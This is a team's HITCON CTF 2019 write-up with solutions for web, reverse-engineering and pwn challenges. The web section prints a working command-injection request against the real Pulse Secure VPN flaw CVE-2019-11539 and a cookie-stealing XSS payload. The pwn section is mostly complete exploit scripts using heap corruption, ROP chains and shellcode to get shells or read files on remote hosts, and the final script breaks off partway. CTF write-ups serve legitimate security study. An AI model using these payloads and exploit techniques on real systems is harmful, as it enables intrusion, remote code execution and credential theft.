# HITCON CTF 2019 Writeup


## web

### Virtual Public Network [183pts]

> http://blog.orange.tw/2019/09/attacking-ssl-vpn-part-3-golden-pulse-secure-rce-chain.html

CVE-2019-11539

![](https://i.loli.net/2019/10/15/U8YQ5DCkc6ZErhv.png)

Use `\x2a` instead of `$`

```
GET /cgi-bin/diag.cgi?options=-r$x%3d"bash+-c+\"/\x2aREAD_FLAG\x2a\"",system$x%23+2>./tmp/cmn.thtml+<&tpl=cmn HTTP/1.1
```

### Luatic [230pts]

![](https://i.loli.net/2019/10/15/Lvr7WmRI3gnPYEs.png)

Use `_GET` to override `_POST` and then use `_POST` to override global variables to bypass filter:

![](https://i.loli.net/2019/10/15/PdLlKoFpGetgYj4.png)

Overwrite math.random with the redis `EVAL` command:

![](https://i.loli.net/2019/10/15/5TUAv7tdmCfRVnu.png)

### Bounty Pl33z [255pts]

After searching, we found that `-->` can be used as a `SingleLineComment`:

> https://stackoverflow.com/a/18638833

But `\n` and `\r` are filtered.

After reading ECMA-262, we found other line terminators:

> http://www.ecma-international.org/ecma-262/6.0/#sec-line-terminators

![](https://i.loli.net/2019/10/15/btWyJmw3Q7o4XMO.png)

So the final payload:

```
http://3.114.5.202/fd.php?q=pupiles。qwer。design/?"%2beval(atob(`ZG9jdW1lbnQuY29va2ll`))%E2%80%A8-->
```

## reverse

### EmojiVM [187pts]
A challenge of vm_re.The Data Struct is a tree like this.

    struct node{
       qword inuse;
       node* parent;
       node* left;
       node* right;
       int value;
       int idx;
    }
    // left->value < parent->value < right->value
we can use emoji(4byte) to specify the appropriate operation（ node->idx corresponding to emoji_value) or use emoji to get a num in stack(0~10 , also by node->idx). If you want to get a num which more than 10, you can pushu some num(0~9) in stack and use add/multi/sub. The correspondence between the opcode and the operand is in sub_4221 and sub_4db8.
By debug the program ,we can get the conditon are:
1. Input string length is 0x18
2. Input form: XXXX-XXXX-XXXX-XXXX-XXXX
3. The conversion rules of each group(4 byte) are as follows:
    First byte: x= x+30
    Second byte: x=(x-8)xor 7
    Third byte: x=((x+44)xor68)-4
    The fourth byte: x=x^0x61
    
```python=
import os
m = [0x8e,0x63,0xcd,0x12,0x4b,0x58,0x15,0x17,0x51,0x22,0xd9,0x04,0x51,0x2c,0x19,0x15,0x86,0x2c,0xd1,0x4c,0x84,0x2e,0x20,0x06]

byte = 0
ans = ''
for i in range(0x18):
   if (i%4)==0:
       byte = m[i]-30
   elif (i%4==1):
       byte = (m[i] ^ 7) + 8
   elif (i%4==2):
       byte = ((m[i] + 4) ^ 68) - 44
   else:
       byte = m[i] ^ 0x61
   ans += chr(byte&0xff)
print ans

```

### Core Dumb [242pts]

There are five encrypted shellcodes in the file, decrypt these shellcodes with `shellcode[i] ^= key[i%4]`. At the beginning of main function, proc init five key and encrypt shellcode,use idapython decrypt shellcode and we can found five function.These functions constrain the flag,`flag[0:10]`:`flag[i] ^= (key[i%4] - 7)`,`flag[10:18]` is similar to TEA,`flag[18:36]` is base64,`flag[36:48]` is similar to rc4,`flag[48:52]` is a hash function, reverse the first four function and exhaustive search the last four bytes to get the flag.

### EV3 Arm [221pts]

The lsm assembly can be retrieved by [lms-hacker-tools](https://github.com/ev3dev/lms-hacker-tools/tree/master/EV3).
Dump all calls in which certain parameters represent motor, power, and angle.
Watch the video given in the problem description, and then we can know how these combinations of parameters work.
Simulate the car by hand to get the flag.

### Suicune [305pts]

A challenge similar with Counting in googlectf. The encryption are implemented with low performance. 
We analyse the binary and get the implmenation of the key generator in details. It contains a very ineffient sorting algorithm.
We remaster the algorithm in high performance and make sure it sharing incomplete post-sorted result with the original one. 
Then we enumerate all the possible key to decrypt the given cipher.
```python
try:
    import numpy as np
except ImportError as e:
    sys.stderr.write('You need to install numpy.\n')

def pcg32(param1:np.uint64=None, param2:np.uint64=None) -> np.uint32:
    """
    All we ever do is call this over and over, so let's make it
    a generator instead of a class.

    param1 -- initial state of the engine.
    param2 -- the increment.

    yields -- an int, of which 32 bits are suitable scrambled.
    """

    np.seterr(all='ignore') # remove overflow messages.

    if param1 is None: param1 = random.random() * 9223372036854775807
    if param2 is None: param2 = random.random() * 9223372036854775807

    engine = np.array([param1, param2], dtype='uint64')
    multiplier = np.uint64(6364136223846793005)
    big_1 = np.uint32(1)
    big_18 = np.uint32(18)
    big_27 = np.uint32(27)
    big_59 = np.uint32(59)
    big_31 = np.uint32(31)

    while True:
        old_state = engine[0]
        inc = engine[1]
        engine[0] = old_state * multiplier + (inc | big_1)
        xorshifted = np.uint32(((old_state >> big_18) ^ old_state) >> big_27)
        rot = np.uint32(old_state >> big_59)
        yield np.uint32((xorshifted >> rot) | (xorshifted << ((-rot) & big_31)))

def reverse(box, left):
    right = len(box)-1
    while(left<right):
        box[left], box[right] = box[right], box[left]
        left += 1
        right -= 1

def find(box, left):
    if left<0:
        return True
    r = len(box) - 1
    while(r!=left):
        # print(left, r)
        if box[left]<box[r]:
            box[left], box[r] = box[r], box[left]
            # fuck
            reverse(box, left+1)
            return True
        r -= 1
    return False

def yysort(box, times):
    l = len(box)

    n = 100
    f = [0] * n
    for i in range(1,n):
        f[i] = (f[i-1]+1)*i-1

    while times != 0:
        left = l-1
        while left!=0 and box[left-1] > box[left]:
            left -= 1
        if left == 0:
            break
        find(box, left-1)
        times -= 1
        if times == 0:
            break
        m = l-left
        while f[m] > times:
            m -= 1
        reverse(box, l-m)
        times -= f[m]

    return box

def unknown_generator(times):
    global x
    box = list(range(0x100))
    for i in range(times):
        xx = next(x) % (0x100-i)
        y = 0xff-i
        box[xx], box[y] = box[y], box[xx]
    return box
    
def shuffle_pcg_result(pcg_res, length):
    res_list = []
    for i in range(0, len(pcg_res), length):
        res_list.append(pcg_res[i: i + length])
    return res_list

def byte_xorer(ba, bb):
    res = b''
    for i in range(len(ba)):
        t = ba[i] ^ bb[i]
        res += bytes([t])
    return res
    
def decrypt(keys, buf):
    rkeys = keys[::-1]
    cur_cipher = buf
    for i in range(16):
        cur_cipher = cur_cipher[::-1]
        cur_cipher = byte_xorer(cur_cipher, rkeys[i])
    return cur_cipher

def encrypt(keys, buf):
    cur_cipher = buf
    for i in range(16):
        key = keys[i]
        print(key)
        cur_cipher = byte_xorer(cur_cipher, key)
        cur_cipher = cur_cipher[::-1]
    return cur_cipher

def keygen():
    global x
    keys = []
    for i in range(16):
        pcg_res = unknown_generator(255)[0: flag_length]
        key_list = pcg_res
        # key_list = sort(reverse = True)
        '''
        The binary uses custom sort algorithm, it won't sort the list completely. 
        However, the binary uses the incompletely sorted list as key. 
        We cannot replay the algorithm in binary for its poor perfomance
        '''
        timesr = (next(x) + 0x100000000) % 0x100000000
        timesl = (next(x) + 0x100000000) % 0x100000000
        times = (timesl << 32) | timesr
        times = (times + 0x10000000000000000) % 0x10000000000000000
        key_list = yysort(key_list, times)
        keys.append(key_list)
        
    return keys

flag_key = 45193
output_file_content = '04dd5a70faea88b76e4733d0fa346b086e2c0efd7d2815e3b6ca118ab945719970642b2929b18a71b28d87855796e344d8'

if __name__=='__main__':
    flag_length = int(len(output_file_content)/2)

    buf = bytes.fromhex(output_file_content)

    state = flag_key*6364136223846793005+6364136223846793005+1
    state &= 0xffffffffffffffff
    x=pcg32(state,1)

    keys = keygen()
    res = decrypt(keys, buf)
    print (res)
```
## pwn

### EmojiiiVM [236pts]

```python
NOP = 1
ADD = 2
SUB = 3
MUL = 4
MOD = 5
XOR = 6
AND = 7
LWR = 8
EQU = 9
JMP = 10
JT = 11
JF = 12
# IMM = 13
POP = 14
# GET = 15
# SET = 16
# NEW = 17
# DEL = 18
EDIT = 19
SHOW = 20


def IMM(v):
    assert v <= 10
    return [13, -v]

def IMMX(v):
    if v <= 10:
        return IMM(v)
    else:
        hi, lo = divmod(v, 10)
        pl = IMMX(hi) + IMM(10) + [MUL]
        if lo != 0:
            pl += IMM(lo) + [ADD]
    return pl

def GET(idx, off):
    return IMMX(off) + IMMX(idx) + [15]

def SET(idx, off):
    return IMMX(off) + IMMX(idx) + [16]

def STR(idx, s):
    pl = []
    for i, c in enumerate(s):
        pl += IMMX(ord(c)) + IMMX(i) + IMM(idx) + [16] # set
    return pl

def GETI():
    return GET(0, 0)

def GETJ():
    return GET(0, 1)

def LOC(i):
    return [i | (1 << 30)] * 14 # len(IMMX(999))

def NEW(sz):
    return IMMX(sz) + [17]

def DEL(i):
    return IMMX(i) + [18]

SZ = 0x82 # 130

pl = []
# pl += NEW(SZ) * 10
loc2 = len(pl)
pl += NEW(SZ)
pl += IMM(1) + GETI() + [ADD] + SET(0, 0) # ++i
pl += IMM(10) + GETI() + [LWR] + LOC(2) + [JT]

pl += DEL(7)

pl += [SUB, ADD]
pl += IMMX(0xB0) + [SUB] + IMM(0) + [SUB] # item9 = item8

pl += DEL(9) + DEL(8) # double free item8 & data8
pl += NEW(0) # item7 = data7 # fix fd = size = 0
pl += NEW(SZ) * 2 # data8 = data9

for i in xrange(7): # tcache
    pl += DEL(i)
pl += DEL(8) # unsoted bin

pl += NEW(SZ)
pl += IMM(8) + SET(0, 0) # i = 8
loc1 = len(pl)
pl += GETI() + IMM(9) + [15] + [22] # print(itoa(item[9][i]))
pl += IMMX(980) + [22]
pl += IMM(1) + GETI() + [ADD] + SET(0, 0) # ++i
pl += IMMX(8 + 6) + GETI() + [LWR] + LOC(1) + [JT]

pl += [NOP]
pl += IMM(9) + [EDIT]
pl += IMMX(0xB0 * 2) + [SUB] + IMM(0) + [SUB] # item9 = data9
pl += IMM(9) + [EDIT]
pl += DEL(9)

pl += [0x17]

print(len(pl))
# print(pl)
i = 0
while i < len(pl):
    v = pl[i]
    if v == LOC(1)[0]:
        r = loc1
    elif v == LOC(2)[0]:
        r = loc2
    else:
        assert type(v) == int
        i += 1
        continue
    a, t = divmod(r, 100)
    b, c = divmod(t, 10)
    t = IMM(a) + IMM(10) + [MUL] + IMM(b) + [ADD] + IMM(10) + [MUL] + IMM(c) + [ADD]
    assert len(t) == 14
    pl = pl[:i] + t + pl[i + 14:]
    i += len(t)
# print(pl)

consts = [128512,128513,128514,129315,128540,128516,128517,128518,128521,128522,128525,]
opcodes = [0,127539,10133,10134,10060,0x2753,10062,128107,128128,128175,128640,127542,127514,9196,128285,128228,128229,127381,127379,128196,128221,128289,128290,0x1F6D1,]

mp = {
0x23EC: '\xE2\x8F\xAC',
0x274c: '\xE2\x9D\x8C',
0x274e: '\xE2\x9D\x8E',
0x2753: '\xE2\x9D\x93',
0x2795: '\xE2\x9E\x95',
0x2796: '\xE2\x9E\x96',
0x1F193: '\xF0\x9F\x86\x93',
0x1F195: '\xF0\x9F\x86\x95',
0x1F21A: '\xF0\x9F\x88\x9A',
0x1F233: '\xF0\x9F\x88\xB3',
0x1F236: '\xF0\x9F\x88\xB6',
0x1f46b: '\xF0\x9F\x91\xAB',
0x1f480: '\xF0\x9F\x92\x80',
0x1f4af: '\xF0\x9F\x92\xAF',
0x1f4c4: '\xF0\x9F\x93\x84',
0x1f4dd: '\xF0\x9F\x93\x9D',
0x1f4e4: '\xF0\x9F\x93\xA4',
0x1f4e5: '\xF0\x9F\x93\xA5',
0x1f51d: '\xF0\x9F\x94\x9D',
0x1f521: '\xF0\x9F\x94\xA1',
0x1f522: '\xF0\x9F\x94\xA2',
0x1f600: '\xF0\x9F\x98\x80',
0x1f601: '\xF0\x9F\x98\x81',
0x1f602: '\xF0\x9F\x98\x82',
0x1f604: '\xF0\x9F\x98\x84',
0x1f605: '\xF0\x9F\x98\x85',
0x1f606: '\xF0\x9F\x98\x86',
0x1f609: '\xF0\x9F\x98\x89',
0x1f60a: '\xF0\x9F\x98\x8A',
0x1f60d: '\xF0\x9F\x98\x8D',
0x1f61c: '\xF0\x9F\x98\x9C',
0x1f680: '\xF0\x9F\x9A\x80',
0x1f6d1: '\xF0\x9F\x9B\x91',
0x1f923: '\xF0\x9F\xA4\xA3',
}


out = []
i = 0
while i < len(pl):
    v = pl[i]
    assert type(v) == int
    if v <= 0:
        t = abs(v)
        assert t <= 10
        out.append(mp[consts[t]])
        i += 1
    elif 0 < v and v < 0x18:
        out.append(mp[opcodes[v]])
        i += 1
    else:
        raise ValueError, v

final = ''.join(out)
print(len(final))
open('payload', 'wb').write(final)
```

```python
from pwn import *
import os


libc = ELF('./libc.so')

context.log_level = 'debug'

# p = process(argv=['./emojivm1', 'payload'])
p = remote('3.115.176.164', 30262)

p.recvuntil('token:\n')
cmd = p.recvline(False)
info('cmd: %s', cmd)

ans = os.popen(cmd).read().strip()
info('ans: %s', ans)
p.sendlineafter('hashcash token: ', ans)

payload = open('payload', 'rb').read()
p.sendlineafter('Your emoji file size: ( MAX: 1000 bytes ) ', str(len(payload)))
p.sendafter('Input your emoji file:\n', payload)

r = 0
for i in xrange(6):
    t = p.recvuntil('980', True)
    r += (int(t) % 256) << (i * 8)
r -= 0x3EBCA0 + 0x100
info('libc: %#x', r)
libc.address = r

pl = p64(0x10) + p64(libc.sym['__free_hook'] - 8)
p.send(pl)

pl = '/bin/sh\0' + p64(libc.sym['system'])
p.send(pl)

p.interactive()
```

### Crypto in the Shell [284pts]

The vulnerability is easy to spot: the encryption causes out-of-bound access. We can encrypt a piece of memory with arbitrary offset and get the result of encryption. Here are steps to exploit:

1. Encrypt the key, and the result of encryption will be shown, which is the new key
2. Encrypt the offset `-0x3a0`, decrypt the result to leak the program address
3. Similarly, encrypt the offset `-0x40` to leak `libc` address, since it stores `stderr`. Note that we can not use `stdout` or `stdin` to leak `libc` address, since they are being used by the program and changing their contents will cause crash
4. Use `libc_addr+0x3f04c0` to leak stack address, then we can rewrite loop variable `i` to bypass number of encryption limitation. However, due to existence of ASLR, we only have `1/2` probability to make `i` negative
5. Brute-force byte-by-byte to rewrite `ld_addr+0x228968` to `"sh"` and `ld_addr+0x228f60` to `&system`. Due to remote timeout, we need to pre-calculate number of encryptions needed to obtain a certain byte and send payloads altogether
6. `exit` to get the shell

```python
from pwn import *
from random import *
from time import time
from hashlib import *
from Crypto.Cipher import AES
from binascii import *

AES_BLOCK_SIZE = 16
g_local=1
context(log_level='debug', arch='amd64')
e = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
if g_local:
    sh = process("./chall")
    gdb.attach(sh)
else:
    sh = remote("3.113.219.89", 31337)

def enc(off, size=0xf):
    off &= 0xffffffffffffffff
    size &= 0xffffffffffffffff
    sh.sendline(str(off))
    sh.sendlineafter("size:", str(size))
    ret = sh.recvuntil("offset:")[:-len("offset:")]
    assert len(ret) % 0x10 == 0
    return ret

key = enc(-0x20)
iv = 0x10 * '\x00'
def dec(data):
    return AES.new(key, AES.MODE_CBC, iv).decrypt(data)
def enc2(data):
    return AES.new(key, AES.MODE_CBC, iv).encrypt(data)

prog_addr = dec(enc(-0x3a0))
prog_addr = u64(prog_addr[8:]) - 0x202008
print hex(prog_addr)


libc_addr = dec(enc(-0x40))
libc_addr = u64(libc_addr[:8]) - e.symbols["_IO_2_1_stderr_"]
print hex(libc_addr)

def calc_off(addr):
    return addr - (prog_addr + 0x2023a0)

env_off = calc_off(libc_addr+0x3f04c0)

stack_addr = dec(enc(env_off))
stack_addr = u64(stack_addr[:8]) + 0x10 - 0x120
print hex(stack_addr)

# 0.5, need to make i negative
enc(calc_off(stack_addr))


# previous bytes might be affected
def write_byte(addr, val, data):
    assert len(data) == 0x10
    off = calc_off(addr - 0xf)
    count = 0
    while True:
        data = enc2(data)
        count += 1
        if u8(data[0xf]) == val:
            break
    for i in xrange(count):
        sh.send(str(off) + '\n15\n')
    for i in xrange(count):
        sh.recvuntil("offset:")
    return data

ld_addr = libc_addr + 0x3f1000

def write_bytes(addr, s, data):
    assert len(data) == 0x10 + len(s)
    i = len(s) - 1
    for c in s[::-1]:
        data = data[:1+i] + write_byte(\
            addr + i, u8(c), data[1+i:0x11+i]) + \
            data[0x11+i:]
        i -= 1

# print hex(u64(dec(enc(calc_off(ld_addr + 0x228f50)))[:8]))
# sh.interactive()
od1 = p64(0) + p64(1)
write_bytes(ld_addr + 0x228968, "sh", od1 + 2*'\x00')
od2 = p64(0) + p64(0)
write_bytes(ld_addr + 0x228f60, \
    p64(libc_addr + e.symbols["system"])[:3], \
    od2+p64(ld_addr+0x10e0)[:3])
# local 0x440->0x441
# remote 0x440->0x496

# print hex(libc_addr + e.symbols["system"])
# print hex(u64(dec(enc(calc_off(ld_addr + 0x228f60)))[:8]))
# print hex(u64(dec(enc(calc_off(ld_addr + 0x228968)))[:8]))

sh.interactive()
```

### LazyHouse [300pts]
```python
from pwn import *
context(arch = 'amd64', os = 'linux', endian = 'little')
context.log_level = 'debug'
libc = ELF("./libc.so.6")

def buy_house(idx, size, content = ''):
    p.recvuntil('Your choice: ')
    p.sendline('1')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('Size:')
    p.sendline(str(size))
    if content != '':
        p.recvuntil('House:')
        p.send(content)

def show_house(idx):
    p.recvuntil('Your choice: ')
    p.sendline('2')
    p.recvuntil('Index:')
    p.sendline(str(idx))

def sell(idx):
    p.recvuntil('Your choice: ')
    p.sendline('3')
    p.recvuntil('Index:')
    p.sendline(str(idx))

def upgrade(idx, content):
    p.recvuntil('Your choice: ')
    p.sendline('4')
    p.recvuntil('Index:')
    p.sendline(str(idx))
    p.recvuntil('House:')
    p.send(content)

def buy_super_house(content):
    p.recvuntil('Your choice: ')
    p.sendline('5')
    p.recvuntil('House:')
    p.send(content)

def GameStart(ip, port, debug):
    global p
    if debug == 1:
        p = process("./lazyhouse")
        # p = process(['ld-linux-x86-64.so.2', './lazyhouse'], env = {'LD_PRELOAD' : './libc.so.6'})
    else:
        p = remote(ip, port)
    buy_house(1, 0x13f69b02593f69b1)
    sell(1)
    buy_house(1, 0x109bb0727572e2bd)
    sell(1)
    buy_house(1, 0x13f2b1389a662c33)
    sell(1)
    buy_house(1, 0x4fcace18cee3091)
    sell(1)
    for i in range(7):
        buy_house(1, 0x100, 'sw tcl')
        sell(1)
    for i in range(8):
        buy_house(i, 0x100, 'sw tcl')
    #pause()
    upgrade(0, '\x00' * 0x100 + p64(0) + p64(0x661))
    sell(1)
    buy_house(1, 0x650, '\x00' * 0x100 + (p64(0) + p64(0x111) + '\x00' * 0x100) * 6)
    sell(2)
    sell(4)
    show_house(1)
    p.recvn(0x110)
    libc_addr = u64(p.recvn(8)) - 0x1e4ca0
    heap_addr = u64(p.recvn(8)) - 0xe00
    log.info('libc addr is : ' + hex(libc_addr))
    log.info('heap addr is : ' + hex(heap_addr))
    buy_house(2, 0x3a0, '\x00')
    sell(2)
    buy_house(2,9999999999999999)
    buy_house(2, 0x100, 'AAA')
    buy_house(4, 0x100, 'AAA')
    sell(1)
    payload = '\x00' * 0x100 + p64(0) + p64(0x111) + p64(0) + p64(0xdeadbeef) + p64(0x21) * (0xf0/8)
    payload += p64(0) + p64(0x21) + p64(0x21) * (0x100/8)
    payload += p64(0) + p64(0x31) + p64(0x21) * (0x100/8)
    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)
    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)
    buy_house(1, 0x650, payload)
    sell(2)
    buy_house(2,9999999999999999)
    sell(3)
    sell(4)
    sell(1)

    payload = '\x00' * 0x100 + p64(0) + p64(0x111) + p64(0) + p64(heap_addr + 0xd00) + p64(0x21) * (0xf0/8)
    payload += p64(0) + p64(0x131) + p64(0x21)*2 + p64(heap_addr+0xbe0) + p64(heap_addr+0x40) + p64(0x21) * (0x100/8 - 4)
    payload += p64(0) + p64(0x141) + p64(heap_addr + 0x40)*5 + p64(0x21) * (0x100/8 - 5)
    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)
    payload += p64(0) + p64(0x141) + p64(0x21) * (0x100/8)
    buy_house(1, 0x650, payload)
    buy_house(3, 0x100, '\x00')
    buy_house(4, 0x100, '\x00')
    sell(5)
    libc.address = libc_addr
    free_hook = libc.symbols['__malloc_hook']
    mprotect = libc.symbols['mprotect']
    open_addr = libc.symbols['open']
    poprdi = libc_addr + 0x26542
    poprdxrsi = libc_addr + 0x012bdc9
    poprsi = libc_addr + 0x026f9e
    leave_ret = libc_addr + 0x0000000000058373
    longjmp = libc_addr + 277552
    buy_house(5, 0x108, p64(free_hook)*(0x108/8))
    buy_super_house(p64(leave_ret))
    buffer_addr = heap_addr + 0xae0
    read_addr = libc.symbols['read']
    write_addr = libc.symbols['write']
    payload = p64(heap_addr) + p64(poprdi) + p64(heap_addr) + p64(poprdxrsi) + p64(7) + p64(0x1000) +  p64(mprotect)
    payload += p64(buffer_addr + 0x40)
    payload += '\x90'*0x8
    code = asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_open',buffer_addr + 0x300, 2))
    code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_read', 'rax', heap_addr, 0x100))
    code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_write', 1 , heap_addr, 0x100))
    code += asm(pwnlib.shellcraft.amd64.linux.syscall('SYS_exit', 0))
    payload += code 
    #upgrade(1, payload.ljust(0x300, '\x00') + "./flag")
    upgrade(1, payload.ljust(0x300,'\x00') + '/home/lazyhouse/flag')
    #pause()
    buy_house(2, str(buffer_addr))
    p.interactive()

if __name__ == '__main__':
    #GameStart('3.115.121.123', 5731, 0)
    GameStart('127.0.0.1', 23335, 0)
```
### PoE I - Luna [284pts]

```python
#! /usr/bin/env python2
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 anciety <anciety@anciety-pc>
#
# Distributed under terms of the MIT license.
import sys
import os
import os.path
from pwn import *
context(os='linux', arch='amd64', log_level='debug')
context.terminal = ['ancyterm', '-s', '192.168.142.1', '-t', 'alacritty', '-e']

# synonyms for faster typing
tube.s = tube.send
tube.sl = tube.sendline
tube.sa = tube.sendafter
tube.sla = tube.sendlineafter
tube.r = tube.recv
tube.ru = tube.recvuntil
tube.rl = tube.recvline
tube.rr = tube.recvregex
tube.irt = tube.interactive

if len(sys.argv) > 2:
    DEBUG = 0
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])

    p = remote(HOST, PORT)
    p.ru('of:\n')
    hashcash = p.rl()
    res = raw_input()
    p.sl(res)
else:
    DEBUG = 1
    if len(sys.argv) == 2:
        PATH = sys.argv[1]

    p = process(PATH)


# by w1tcher who dominates pwnable challenges
def house_of_orange(head_addr, system_addr, io_list_all):
    payload = b'/bin/sh\x00'
    payload = payload + p64(0x61) + p64(0) + p64(io_list_all - 16)
    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0) * 4
    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0) + \
            p64(0xffffffffffffffff) + p64(0) * 2 + p64(head_addr + 12 * 8)
    return payload


orig_attach = gdb.attach
def gdb_attach(*args, **kwargs):
    if DEBUG:
        orig_attach(*args, **kwargs)
gdb.attach = gdb_attach

def cmd(f):
    def wrapped_cmd(*args, **kwargs):
        p.ru('>>> ')
        f(*args, **kwargs)
    return wrapped_cmd


@cmd
def insert(idx, content):
    p.sl('i {} {}'.format(idx, content))

@cmd
def cut(idx, count):
    p.sl('c {} {}'.format(idx, count))

@cmd
def new_tab():
    p.sl('n')

@cmd
def switch(to):
    p.sl('s {}'.format(to))

@cmd
def paste(idx):
    p.sl('p {}'.format(idx))

@cmd
def replace(idx, length, c):
    p.sl('r {} {} {}'.format(idx, length, c))

@cmd
def delete(idx, length):
    p.sl('D {} {}'.format(idx, length))

@cmd
def display(idx, size):
    p.sl('d {} {}'.format(idx, size))

def main():
    p.ru('Luna - ')
    p.ru('--------------')
    insert(0, 'a' * 0xf8)
    new_tab() # 1
    insert(0, 'b' * 0x10)
    cut(0, 0x10) # full cut
    switch(0)
    cut(0, 0xf0) # partial cut

    # now the pastebin should have a cache of 0x10, but length of 0x200
    # transfer pastebin to current tab
    new_tab() # 2
    paste(0)

    # now we can use replace to OOB write the heap (on tab #2)
    # but let's get out a freed chunk first
    new_tab() # 3
    insert(0, 'f' * 0xf8)
    new_tab() # 4
    insert(0, 'g' * 0xf8)
    switch(3)
    #raw_input('>> break free')
    delete(0, 0xf8) # free(chunk of size(0x208))
    switch(4)
    delete(0, 0xf8)

    switch(2)

    # target 0xd10
    # we are at 0xc80

    __free_hook = target = 0x6D9E78 # __free_hook
    idx = 0xd10 - 0xc80

    packed = p64(target)
    
    for i in range(len(packed)):
        c = packed[i]
        replace(idx + i, 1, c)

    new_tab() # 3
    switch(3)

    pivot = 0x00000000004a8f86 # mov rsp, rcx ; ret
    add_rsp_80 = 0x0000000000416cf7 # add rsp, 0x80 ; ret
    add_rsp_d8 = 0x0000000000410a83 # add rsp, 0xd8 ; ret
    pop_rdi_rbp = 0x00000000004038d5 # pop rdi ; pop rbp ; ret
    pop_rdi = 0x00000000004006a6 # pop rdi ; ret
    pop_rsi_rbp = 0x0000000000410cee # pop rsi ; pop rbp ; ret
    pop_rsi = 0x0000000000411583 # pop rsi ; ret
    pop_rax_rdx_rbx = 0x000000000048bf36 # pop rax ; pop rdx ; pop rbx ; ret
    xor_rax = 0x0000000000445e70 # xor rax, rax ; ret
    add_rax_1 = 0x000000000047eb80 # add rax, 1 ; ret
    syscall = 0x47f927
    sal_edi = 0x000000000048b1cd # sal edi, 0xd8 ; ret
    mov_edi_edx = 0x0000000000497b71 # mov edi, edx ; mov byte ptr [rsi], al ; jne 0x497b59 ; mov rax, rsi ; ret
    xchg_eax_ebp = 0x00000000004517bf # xchg eax, ebp ; ret
    add_eax_3 = 0x000000000047eb91 # add eax, 3 ; ret
    mov_rax_1 = 0x000000000047ebb0 # mov rax, 1 ; ret 
    mov_rax_2 = 0x000000000047ebc0 # mov rax, 2 ; ret
    mov_rax_3 = 0x000000000047ebd0 # mov rax, 3 ; ret
    xor_eax = 0x000000000040feed # xor eax, eax ; ret

    pop_rdx = 0x000000000044ab35 # pop rdx ; ret 
    pop_rdx_rbx = 0x000000000048bf37 # pop rdx ; pop rbx ; ret
    open_fn = 0x44aa80
    read_fn = 0x44ab20
    puts_fn = 0x411720
    fputs_fn = 0x479770

    data = 0x6da100
    # 0x44 X
    ## 0x15 X
    flag1_addr = data
    rop = p64(mov_rax_3)
    rop += p64(pop_rdi)
    rop += p64(2)
    rop += p64(syscall)
    rop += p64(pop_rdi)
    rop += p64(flag1_addr)
    rop += p64(pop_rsi_rbp)
    rop += p64(0)
    rop += p64(0)
    rop += p64(mov_rax_2)
    rop += p64(syscall)
    
    rop += p64(pop_rdi)
    rop += p64(2)
    rop += p64(pop_rsi_rbp)
    rop += p64(data)
    rop += p64(0)
    rop += p64(pop_rdx_rbx)
    rop += p64(0x100)
    rop += p64(0)
    rop += p64(mov_rax_1)
    rop += p64(xor_eax)
    rop += p64(syscall)
    rop += p64(pop_rdi)
    rop += p64(1)
    rop += p64(pop_rsi_rbp)
    rop += p64(data)
    rop += p64(0)
    rop += p64(mov_rax_1)
    rop += p64(syscall)

    print(len(rop))
    assert len(rop) <= 0xf0

    insert(0, 'flag1\x00'.ljust(0xf8, 'c'))
    new_tab() # 4
    switch(4)
    insert(0, 'a' * 8)
    cut(0, 1)
    new_tab() # 5
    switch(5)
    insert(0, p64(pivot) + rop.ljust(0xf0, '1'))
    #insert(0, p64(pivot) + '\x00' * 0xf0)
    switch(2)
    idx = 0xcd0 - 0xc80
    replace(idx, 1, chr(0xd0))
    display(0, 8)
    p.info(p.ru('\xd0'))
    leaked = '\xd0'
    while len(leaked) < 8:
        leaked += p.r(8 - len(leaked))
    heap_addr = u64(leaked)
    p.info('leaked heap 0x{:x}'.format(heap_addr))

    switch(2)
    replace(0, 1, chr(0x60))
    target = 0x555555babeb0 - 0x555555babcd0 + heap_addr
    payload = p32(0x500) + p32(1) + p64(0) + p64(target)
    for i in range(len(payload)):
        c = payload[i]
        replace(i, 1, c)

    new_tab()
    #switch(1)
    p.sl('s 1')
    pop_rsp = 0x0000000000403073 # pop rsp ; ret
    data = 0x6da100

    temp = p64(pop_rsp)
    temp += p64(__free_hook + 8)
    for i in range(len(temp)):
        c = temp[i]
        replace(i, 1, c)


    switch(2)
    #target = 0x555555babeb0 - 0x555555babcd0 + heap_addr + 0xd8
    target = data
    payload = p64(target)
    for i in range(len(payload)):
        c = payload[i]
        replace(0x10 + i, 1, c)

    raw_input('>> break final')
    switch(1)
    rop = '/home/poe/flag1\x00'
    for i in range(len(rop)):
        c = rop[i]
        replace(i, 1, c)

    # trigger __free_hook
    switch(6)
    paste(0)

    p.irt()

if __name__ == '__main__':
    main()

```
### dadadb [371pts]
```python
from utility import *
from pprint import pprint

debug = 0
if debug:
    p = pwn('127.0.0.1:4869')
    ntdll_off = 0x2a0 + 32
    to_ntdll = 0x163D40  # 0x15ACB0
    to_peb = 0x165368  # 0x15C338
    to_stack = 0xcd0
else:
    p = pwn('13.230.51.176:4869')
    ntdll_off = 0x2a0 + 32
    to_ntdll = 0x163d10
    to_peb = 0x165368
    to_stack = 0xcd0
p.sendlineafter('>>', '1')
p.sendlineafter(':', 'orange')
p.sendlineafter(':', 'godlike')


def pad(k):
    return k.ljust(0x40 - 1, '\x00')


def create(key, buf, size=None):
    if not size:
        size = len(buf)
    key = pad(key)
    p.sendlineafter('>>', '1')
    p.sendlineafter(':', key)
    p.sendlineafter(':', str(size))
    if len(buf) >= size:
        p.sendafter(':', buf)
    else:
        p.sendlineafter(':', buf)


def show(key):
    key = pad(key)
    p.sendlineafter('>>', '2')
    p.sendlineafter(':', key)
    p.recvuntil('Data:')


def logout():
    p.sendlineafter('>>', '4')


def free(key):
    key = pad(key)
    p.sendlineafter('>>', '3')
    p.sendlineafter(':', key)


create('\x05', 'a' * 0x50)
create('\x01', 'b' * 0x50)
create('\x02', 'c' * 0x500)
free('\x05')
create('\x02', 'd' * 0xb0)
